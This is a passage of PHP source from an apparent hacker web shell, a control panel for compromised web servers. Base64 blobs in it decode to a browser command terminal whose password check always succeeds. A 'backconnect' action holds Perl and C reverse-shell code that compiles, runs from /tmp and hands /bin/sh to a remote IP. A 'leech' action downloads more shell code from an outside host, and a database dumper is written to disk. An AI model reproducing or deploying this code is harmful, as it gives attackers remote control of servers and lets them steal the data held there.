nJyk7DQplcnJvcl9yZXBvcnRpbmcoMSk7DQpjbGFzcyBwaHB0aGllbmxlIHsNCg0KZnVuY3Rpb24gZm9ybWF0UHJvbXB0KCkgew0KJHVzZXI9c2hlbGxfZXhlYygid2hvYW1pIik7DQokaG9zdD1leHBsb2RlKCIuIiwgc2hlbGxfZXhlYygidW5hbWUgLW4iKSk7DQokX1NFU1NJT05bJ3Byb21wdCddID0gIiIucnRyaW0oJHVzZXIpLiIiLiJAIi4iIi5ydHJpbSgkaG9zdFswXSkuIiI7DQp9DQoNCmZ1bmN0aW9uIGNoZWNrUGFzc3dvcmQoJHBhc3N3ZCkgew0KaWYoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pfHwNCiFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwNCiFpc3NldCgkcGFzc3dkWyRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ11dKSB8fA0KJHBhc3N3ZFskX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddXSAhPSAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgew0KQHNlc3Npb25fc3RhcnQoKTsNCnJldHVybiB0cnVlOw0KfQ0KZWxzZSB7DQpAc2Vzc2lvbl9zdGFydCgpOw0KcmV0dXJuIHRydWU7DQp9DQp9DQoNCmZ1bmN0aW9uIGluaXRWYXJzKCkNCnsNCmlmIChlbXB0eSgkX1NFU1NJT05bJ2N3ZCddKSB8fCAhZW1wdHkoJF9SRVFVRVNUWydyZXNldCddKSkNCnsNCiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsNCiRfU0VTU0lPTlsnaGlzdG9yeSddID0gYXJyYXkoKTsNCiRfU0VTU0lPTlsnb3V0cHV0J10gPSAnJzsNCiRfUkVRVUVTVFsnY29tbWFuZCddID0nJzsNCn0NCn0NCg0KZnVuY3Rpb24gYnVpbGRDb21tYW5kSGlzdG9yeSgpDQp7DQppZighZW1wdHkoJF9SRVFVRVNUWydjb21tYW5kJ10pKQ0Kew0KaWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkNCnsNCiRfUkVRVUVTVFsnY29tbWFuZCddID0gc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFsnY29tbWFuZCddKTsNCn0NCg0KLy8gZHJvcCBvbGQgY29tbWFuZHMgZnJvbSBsaXN0IGlmIGV4aXN0cw0KaWYgKCgkaSA9IGFycmF5X3NlYXJjaCgkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJF9TRVNTSU9OWydoaXN0b3J5J10pKSAhPT0gZmFsc2UpDQp7DQp1bnNldCgkX1NFU1NJT05bJ2hpc3RvcnknXVskaV0pOw0KfQ0KYXJyYXlfdW5zaGlmdCgkX1NFU1NJT05bJ2hpc3RvcnknXSwgJF9SRVFVRVNUWydjb21tYW5kJ10pOw0KDQovLyBhcHBlbmQgY29tbW1hbmQgKi8NCiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gInskX1NFU1NJT05bJ3Byb21wdCddfSIuIjo+Ii4ieyRfUkVRVUVTVFsnY29tbWFuZCddfSIuIlxuIjsNCn0NCn0NCg0KZnVuY3Rpb24gYnVpbGRKYXZhSGlzdG9yeSgpDQp7DQovLyBidWlsZCBjb21tYW5kIGhpc3RvcnkgZm9yIHVzZSBpbiB0aGUgSmF2YVNjcmlwdA0KaWYgKGVtcHR5KCRfU0VTU0lPTlsnaGlzdG9yeSddKSkNCnsNCiRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J10gPSAnIiInOw0KfQ0KZWxzZQ0Kew0KJGVzY2FwZWQgPSBhcnJheV9tYXAoJ2FkZHNsYXNoZXMnLCAkX1NFU1NJT05bJ2hpc3RvcnknXSk7DQokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiLCAiJyAuIGltcGxvZGUoJyIsICInLCAkZXNjYXBlZCkgLiAnIic7DQp9DQp9DQoNCmZ1bmN0aW9uIG91dHB1dEhhbmRsZSgkYWxpYXNlcykNCnsNCmlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKQ0Kew0KJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOyAvL2Rpcm5hbWUoX19GSUxFX18pOw0KfQ0KZWxzZWlmKGVyZWcoJ15bWzpibGFuazpdXSpjZFtbOmJsYW5rOl1dKyhbXjtdKykkJywgJF9SRVFVRVNUWydjb21tYW5kJ10sICRyZWdzKSkNCnsNCi8vIFRoZSBjdXJyZW50IGNvbW1hbmQgaXMgJ2NkJywgd2hpY2ggd2UgaGF2ZSB0byBoYW5kbGUgYXMgYW4gaW50ZXJuYWwgc2hlbGwgY29tbWFuZC4NCi8vIGFic29sdXRlL3JlbGF0aXZlIHBhdGggPyINCigkcmVnc1sxXVswXSA9PSAnLycpID8gJG5ld19kaXIgPSAkcmVnc1sxXSA6ICRuZXdfZGlyID0gJF9TRVNTSU9OWydjd2QnXSAuICcvJyAuICRyZWdzWzFdOw0KDQovLyBjb3NtZXRpY3MNCndoaWxlIChzdHJwb3MoJG5ld19kaXIsICcvLi8nKSAhPT0gZmFsc2UpDQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLi8nLCAnLycsICRuZXdfZGlyKTsNCndoaWxlIChzdHJwb3MoJG5ld19kaXIsICcvLycpICE9PSBmYWxzZSkNCiRuZXdfZGlyID0gc3RyX3JlcGxhY2UoJy8vJywgJy8nLCAkbmV3X2Rpcik7DQp3aGlsZSAocHJlZ19tYXRjaCgnfC9cLlwuKD8hXC4pfCcsICRuZXdfZGlyKSkNCiRuZXdfZGlyID0gcHJlZ19yZXBsYWNlKCd8Lz9bXi9dKy9cLlwuKD8hXC4pfCcsICcnLCAkbmV3X2Rpcik7DQoNCmlmKGVtcHR5KCRuZXdfZGlyKSk6ICRuZXdfZGlyID0gIi8iOyBlbmRpZjsNCg0KKEBjaGRpcigkbmV3X2RpcikpID8gJF9TRVNTSU9OWydjd2QnXSA9ICRuZXdfZGlyIDogJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAiY291bGQgbm90IGNoYW5nZSB0bzogJG5ld19kaXJcbiI7DQp9DQplbHNlDQp7DQovKiBUaGUgY29tbWFuZCBpcyBub3QgYSAnY2QnIGNvbW1hbmQsIHNvIHdlIGV4ZWN1dGUgaXQgYWZ0ZXINCiogY2hhbmdpbmcgdGhlIGRpcmVjdG9yeSBhbmQgc2F2ZSB0aGUgb3V0cHV0LiAqLw0KY2hkaXIoJF9TRVNTSU9OWydjd2QnXSk7DQoNCi8qIEFsaWFzIGV4cGFuc2lvbi4gKi8NCiRsZW5ndGggPSBzdHJjc3BuKCRfUkVRVUVTVFsnY29tbWFuZCddLCAiIFx0Iik7DQokdG9rZW4gPSBzdWJzdHIoQCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsNCmlmIChpc3NldCgkYWxpYXNlc1skdG9rZW5dKSkNCiRfUkVRVUVTVFsnY29tbWFuZCddID0gJGFsaWFzZXNbJHRva2VuXSAuIHN1YnN0cigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJGxlbmd0aCk7DQoNCiRwID0gcHJvY19vcGVuKEAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwNCmFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLA0KMiA9PiBhcnJheSgncGlwZScsICd3JykpLA0KJGlvKTsNCg0KLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRvdXQuICovDQp3aGlsZSAoIWZlb2YoJGlvWzFdKSkgew0KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSBodG1sc3BlY2lhbGNoYXJzKGZnZXRzKCRpb1sxXSksRU5UX0NPTVBBVCwgJ1VURi04Jyk7DQp9DQovKiBSZWFkIG91dHB1dCBzZW50IHRvIHN0ZGVyci4gKi8NCndoaWxlICghZmVvZigkaW9bMl0pKSB7DQokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsNCn0NCg0KZmNsb3NlKCRpb1sxXSk7DQpmY2xvc2UoJGlvWzJdKTsNCnByb2NfY2xvc2UoJHApOw0KfQ0KfQ0KfSAvLyBlbmQgcGhwdGhpZW5sZQ0KDQovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjDQojIyBUaGUgbWFpbiB0aGluZyBzdGFydHMgaGVyZQ0KIyMgQWxsIG91dHB1dCBpc3QgWEhUTUwNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjKi8NCiR0ZXJtaW5hbD1uZXcgcGhwdGhpZW5sZTsNCkBzZXNzaW9uX3N0YXJ0KCk7DQokdGVybWluYWwtPmluaXRWYXJzKCk7DQokdGVybWluYWwtPmJ1aWxkQ29tbWFuZEhpc3RvcnkoKTsNCiR0ZXJtaW5hbC0+YnVpbGRKYXZhSGlzdG9yeSgpOw0KaWYoIWlzc2V0KCRfU0VTU0lPTlsncHJvbXB0J10pKTogJHRlcm1pbmFsLT5mb3JtYXRQcm9tcHQoKTsgZW5kaWY7DQokdGVybWluYWwtPm91dHB1dEhhbmRsZSgkYWxpYXNlcyk7DQoNCmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsNCmVjaG8gJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+JyAuICJcbiI7DQovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjDQojIyBzYWZlIG1vZGUgaW5jcmVhc2UNCiMjIGJsb3F1ZSBmb25jdGlvbg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMqLw0KPz4NCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFN0cmljdC8vRU4iDQoiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtc3RyaWN0LmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sOmxhbmc9ImVuIiBsYW5nPSJlbiI+DQo8aGVhZD4NCjx0aXRsZT48P3BocCBlY2hvICJXZWJzaXRlIDogIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIiI7Pz4gfCA8P3BocCBlY2hvICJJUCA6ICIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiI7Pz48L3RpdGxlPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGxhbmd1YWdlPSJKYXZhU2NyaXB0Ij4NCnZhciBjdXJyZW50X2xpbmUgPSAwOw0KdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsNCnZhciBsYXN0ID0gMDsNCmZ1bmN0aW9uIGtleShlKSB7DQppZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50Ow0KaWYgKGUua2V5Q29kZSA9PSAzOCAmJiBjdXJyZW50X2xpbmUgPCBjb21tYW5kX2hpc3QubGVuZ3RoLTEpIHsNCmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsNCmN1cnJlbnRfbGluZSsrOw0KZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZSA9IGNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdOw0KfQ0KaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7DQpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7DQpjdXJyZW50X2xpbmUtLTsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsNCn0NCn0NCmZ1bmN0aW9uIGluaXQoKSB7DQpkb2N1bWVudC5zaGVsbC5zZXRBdHRyaWJ1dGUoImF1dG9jb21wbGV0ZSIsICJvZmYiKTsNCmRvY3VtZW50LnNoZWxsLm91dHB1dC5zY3JvbGxUb3AgPSBkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsSGVpZ2h0Ow0KZG9jdW1lbnQuc2hlbGwuY29tbWFuZC5mb2N1cygpOw0KfQ0KPC9zY3JpcHQ+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7Zm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7IGNvbG9yOiBibGFjazsgYmFja2dyb3VuZDogd2hpdGU7fQ0KdGFibGV7d2lkdGg6IDEwMCU7IGhlaWdodDogMjUwcHg7IGJvcmRlcjogMXB4ICMwMDAwMDAgc29saWQ7IHBhZGRpbmc6IDBweDsgbWFyZ2luOiAwcHg7fQ0KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQ0KdGV4dGFyZWEge3dpZHRoOiAxMDAlOyBib3JkZXI6IG5vbmU7IHBhZGRpbmc6IDJweCAycHggMnB4OyBjb2xvcjogI0NDQ0NDQzsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDt9DQpwLnByb21wdCB7Zm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgbWFyZ2luOiAwcHg7IHBhZGRpbmc6IDBweCAycHggMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyBjb2xvcjogI0NDQ0NDQzt9DQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IG9ubG9hZD0iaW5pdCgpIj4NCjxoMj5EZXZlbG9wZXIgQnkgS3ltTGpuazwvaDI+DQoNCjw/cGhwIGlmIChlbXB0eSgkX1JFUVVFU1RbJ3Jvd3MnXSkpICRfUkVRVUVTVFsncm93cyddID0gMjY7ID8+DQoNCjx0YWJsZSBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPg0KPHRyPjx0ZCBjbGFzcz0iaGVhZCIgc3R5bGU9ImNvbG9yOiAjMDAwMDAwOyI+PGI+UFdEIDo8L2I+PC90ZD4NCjx0ZCBjbGFzcz0iaGVhZCI+PD9waHAgZWNobyAkX1NFU1NJT05bJ3Byb21wdCddLiI6Ii4iJF9TRVNTSU9OW2N3ZF0iOyA/Pg0KPC90ZD48L3RyPg0KPHRyPjx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2xzcGFuPScyJz48Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+IiBtZXRob2Q9InBvc3QiPg0KPHRleHRhcmVhIG5hbWU9Im91dHB1dCIgcmVhZG9ubHk9InJlYWRvbmx5IiBjb2xzPSI4NSIgcm93cz0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiI+DQo8P3BocA0KJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOw0KJHBhZGRpbmcgPSBzdHJfcmVwZWF0KCJcbiIsIG1heCgwLCAkX1JFUVVFU1RbJ3Jvd3MnXSsxIC0gJGxpbmVzKSk7DQplY2hvIHJ0cmltKCRwYWRkaW5nIC4gJF9TRVNTSU9OWydvdXRwdXQnXSk7DQo/Pg0KPC90ZXh0YXJlYT4NCjxwIGNsYXNzPSJwcm9tcHQiPjw/cGhwIGVjaG8gJF9TRVNTSU9OWydwcm9tcHQnXS4iOj4iOyA/Pg0KPGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiIG9ua2V5dXA9ImtleShldmVudCkiIHNpemU9IjYwIiB0YWJpbmRleD0iMSI+DQo8L3A+DQoNCjw/IC8qPHA+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSBDb21tYW5kIiAvPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0icmVzZXQiIHZhbHVlPSJSZXNldCIgLz4NClJvd3M6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyb3dzIiB2YWx1ZT0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiIgLz4NCjwvcD4NCiovPz4NCjwvZm9ybT48L3RkPjwvdHI+DQo8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCA/Pg==';
        $file       = fopen("command.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=command.php width=63% height=700px frameborder=0></iframe> ";
        echo "<iframe src=http://dl.dropbox.com/u/74425391/command.html width=35% height=700px frameborder=0></iframe> ";
    } elseif ($action == 'backconnect') {
        !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
        !$yourport && $yourport = '7777';
        $usedb          = array(
            'perl' => 'perl',
            'c' => 'c'
        );
        $back_connect   = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj" . "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" . "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT" . "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" . "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi" . "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl" . "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
        $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" . "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" . "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" . "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" . "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC" . "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D" . "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" . "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
        if ($start && $yourip && $yourport && $use) {
            if ($use == 'perl') {
                cf('/tmp/angel_bc', $back_connect);
                $res = execute(which('perl') . " /tmp/angel_bc $yourip $yourport &");
            } else {
                cf('/tmp/angel_bc.c', $back_connect_c);
                $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
                @unlink('/tmp/angel_bc.c');
                $res = execute("/tmp/angel_bc $yourip $yourport &");
            }
            m("Now script try connect to $yourip port $yourport ...");
        }
        formhead(array(
            'title' => 'Command : nc -vv -l -p 7777'
        ));
        makehide('action', 'backconnect');
        p('
    ');
        p('Your IP:');
        makeinput(array(
            'name' => 'yourip',
            'size' => 20,
            'value' => $yourip
        ));
        p('Your Port:');
        makeinput(array(
            'name' => 'yourport',
            'size' => 15,
            'value' => $yourport
        ));
        p('Use:');
        makeselect(array(
            'name' => 'use',
            'option' => $usedb,
            'selected' => $use
        ));
        makeinput(array(
            'name' => 'start',
            'value' => 'Start',
            'type' => 'submit',
            'class' => 'bt'
        ));
        p('
     
    ');
        formfoot();
    } elseif ($action == 'leech') {
        $dizin = $_SERVER['PHP_SELF'];
    $functions_shell =  'http://'.$_SERVER['HTTP_HOST'].dirname($dizin).'/clown_functions.php';
    if($_GET["Giris"]=="Denetle")
    {
    # Shell  
    $b37 = 'http://brutalcraft.pusku.com/clown_functions/clown_functions.txt';
    $sh = file_get_contents($b37);
    $open = fopen('clown_functions.php', 'w');
    fwrite($open,$sh);
    fclose($open);
    if($open) {
        echo "<font color='red' face='Trebuchet MS' size='+3'>"."<center>"."Shell Denetlendi!"."<br />Guncellemeler Yapildi!"."<br /><a href='$functions_shell'>KULLAN</a>"."</center>"."</font>";
    } else {
        echo "<font color='red' face='Trebuchet MS' size='+3'>"."<center>Error !</center>"."</font>";
    }
    }
        echo "<iframe src=functions.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'brute') {
        $file       = fopen($dir . "brute.php", "w+");
        $perltoolss = '
    ';
        $file       = fopen("brute.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=brute.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'dumper') {
        $file       = fopen($dir . "dumper.php", "w+");
        $file       = mkdir("backup");
        $file       = chmod("backup", 0755);
        $perltoolss = 'PD9waHAKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlwKfCBTeXBleCBEdW1wZXIgTGl0ZSAgICAgICAgICB2ZXJzaW9uIDEuMC44YiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAoYykyMDAzLTIwMDYgemFwaW1pciAgICAgICB6YXBpbWlyQHphcGltaXIubmV0ICAgICAgIGh0dHA6Ly9zeXBleC5uZXQvICAgIHwKfCAoYykyMDA1LTIwMDYgQklOT1ZBVE9SICAgICBpbmZvQHN5cGV4Lm5ldCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCAgICAgY3JlYXRlZDogMjAwMy4wOS4wMiAxOTowNyAgICAgICAgICAgICAgbW9kaWZpZWQ6IDIwMDguMTIuMTQgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yICAgICAgICAgICAgIHwKfCBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgICAgICAgIHwKfCBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiAgICAgICAgICAgIHwKfCBvZiB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4gICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwgICAgICAgICAgIHwKfCBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZiAgICAgICAgICAgIHwKfCBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlICAgICAgICAgICAgIHwKfCBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgIHwKfCBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSAgICAgICAgICAgICAgIHwKfCBGb3VuZGF0aW9uLCBJbmMuLCA1OSBUZW1wbGUgUGxhY2UgLSBTdWl0ZSAzMzAsIEJvc3RvbiwgTUEgMDIxMTEtMTMwNyxVU0EuIHwKXCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8vIHBhdGggYW5kIFVSTCB0byBiYWNrdXAgZmlsZXMKZGVmaW5lKCdQQVRIJywgJ2JhY2t1cC8nKTsKZGVmaW5lKCdVUkwnLCAgJ2JhY2t1cC8nKTsKLy8gTWF4IHRpbWUgZm9yIHRoaXMgc2NyaXB0IHdvcmsgKGluIHNlY29uZHMpCi8vIDAgLSBubyBsaW1pdApkZWZpbmUoJ1RJTUVfTElNSVQnLCA2MDApOwovLyDQntCz0YDQsNC90LjRh9C10L3QuNC1INGA0LDQt9C80LXRgNCwINC00LDQvdC90YvRhSDQtNC+0YHRgtCw0LLQsNC10LzRi9GFINC30LAg0L7QtNC90L4g0L7QsdGA0LDRidC10L3QuNGPINC6INCR0JQgKNCyINC80LXQs9Cw0LHQsNC50YLQsNGFKQovLyDQndGD0LbQvdC+INC00LvRjyDQvtCz0YDQsNC90LjRh9C10L3QuNGPINC60L7Qu9C40YfQtdGB0YLQstCwINC/0LDQvNGP0YLQuCDQv9C+0LbQuNGA0LDQtdC80L7QuSDRgdC10YDQstC10YDQvtC8INC/0YDQuCDQtNCw0LzQv9C1INC+0YfQtdC90Ywg0L7QsdGK0LXQvNC90YvRhSDRgtCw0LHQu9C40YYKZGVmaW5lKCdMSU1JVCcsIDEpOwovLyBteXNxbCBzZXJ2ZXIKZGVmaW5lKCdEQkhPU1QnLCAnbG9jYWxob3N0OjMzMDYnKTsKLy8gRGF0YWJhc2VzLiBJdCBpcyBuZWVkIGlmIHNlcnZlciBkb2VzIG5vdCBhbGxvdyBsaXN0IGRhdGFiYXNlIG5hbWVzCi8vIGFuZCBub3RoaW5nIHNob3dzIGFmdGVyIGxvZ2luLiAoc2VwYXJhdGVkIGJ5IGNvbW1hKQpkZWZpbmUoJ0RCTkFNRVMnLCAnJyk7Ci8vINCa0L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyDRgSBNeVNRTAovLyBhdXRvIC0g0LDQstGC0L7QvNCw0YLQuNGH0LXRgdC60LjQuSDQstGL0LHQvtGAICjRg9GB0YLQsNC90LDQstC70LjQstCw0LXRgtGB0Y8g